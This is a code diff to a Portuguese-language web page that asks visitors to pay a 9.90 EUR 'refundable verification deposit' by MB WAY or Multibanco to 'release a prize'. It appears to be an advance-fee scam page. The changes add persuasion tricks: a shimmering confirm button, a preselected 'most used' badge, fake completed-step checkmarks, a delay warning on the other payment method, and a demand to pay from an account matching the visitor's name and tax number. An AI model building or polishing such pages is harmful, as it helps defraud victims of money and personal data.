@@ -134,9 +134,23 @@
 
         .payment-option:hover,
         .payment-option.selected {
-            border-color: #d32f2f;
-            background: #fff5f5;
+            border-color: #2e7d32;
+            background: #f1f8e9;
         }
+
+        .badge-most-used {
+            position: absolute;
+            top: -10px;
+            background: #2e7d32;
+            color: white;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-weight: 700;
+            display: none;
+        }
+
+        /* Show badge only inside selected payment option if needed, but here we control via inline block toggling or specific structure */
 
         .payment-logo {
             max-width: 100%;
@@ -159,6 +173,37 @@
             text-transform: uppercase;
             letter-spacing: 0.5px;
             transition: transform 0.1s;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .validation-btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            animation: shimmer 2.5s infinite;
+        }
+
+        @keyframes shimmer {
+            0% {
+                left: -100%;
+            }
+
+            50% {
+                left: 100%;
+            }
+
+            100% {
+                left: 100%;
+            }
         }
 
         .validation-btn:active {
@@ -215,6 +260,12 @@
     <div class="main-container">
 
         <div class="security-header">
+            <div
+                style="display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; font-size: 11px; color: #2e7d32; margin-bottom: 15px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">
+                <span style="white-space: nowrap;">✓ Voucher gerado</span>
+                <span style="white-space: nowrap;">✓ Dados confirmados</span>
+                <span style="white-space: nowrap;">⏳ Validação de titularidade</span>
+            </div>
             <svg class="padlock-icon" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                 stroke-width="2">
                 <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
@@ -238,7 +289,7 @@
             </p>
 
             <div class="info-row highlight" style="color: #2e7d32; border-top-color: #a5d6a7;">
-                <span>Valor de Verificação Temporária</span>
+                <span>Depósito Temporário de Verificação</span>
                 <span>9,90 €</span>
             </div>
             <p style="font-size: 10px; color: #1b5e20; margin-bottom: 0; text-align: right;">*100% Reembolsável</p>
@@ -247,19 +298,39 @@
         <h3 style="font-size: 15px; font-weight: 700; margin-bottom: 15px;">Selecione o método para validar:</h3>
 
         <div class="payment-grid">
-            <div class="payment-option" onclick="selectPayment(this, 'mbway')">
+            <div class="payment-option selected" onclick="selectPayment(this, 'mbway')" style="position: relative;">
+                <div class="badge-most-used" style="display: block;">MAIS USADO</div>
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Logo_MBWay.svg/1280px-Logo_MBWay.svg.png"
                     class="payment-logo" alt="MB WAY">
+                <div style="display: flex; align-items: center; justify-content: center; gap: 4px; margin-top: 5px;">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="#2e7d32" stroke="#2e7d32" stroke-width="2"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+                    </svg>
+                    <span style="font-size: 11px; color: #2e7d32; font-weight: 600;">Ativação imediata do voucher</span>
+                </div>
             </div>
 
             <div class="payment-option" onclick="selectPayment(this, 'multibanco')">
                 <img src="https://www.multibanco.pt/wp-content/uploads/2025/01/Multibanco-Logo-CMYK.svg"
                     class="payment-logo" alt="Multibanco">
+                <p style="margin: 5px 0 0; font-size: 11px; color: #777;">Pode demorar +24h</p>
             </div>
         </div>
 
-        <button class="validation-btn" onclick="processPayment()">
-            Validar & Libertar Prémio
+        <p
+            style="text-align: center; font-size: 11px; color: #666; margin: -15px 0 20px 0; padding: 0 10px; line-height: 1.4;">
+            O pagamento deve ser efetuado a partir de uma conta com o mesmo nome e NIF informados.
+        </p>
+
+        <button class="validation-btn" onclick="processPayment()"
+            style="background: #2e7d32; box-shadow: 0 4px 0 #1b5e20; display: flex; align-items: center; justify-content: center; gap: 10px;">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+                stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 9.9-1"></path>
+            </svg>
+            Confirmar Validação
         </button>
     </div>
 
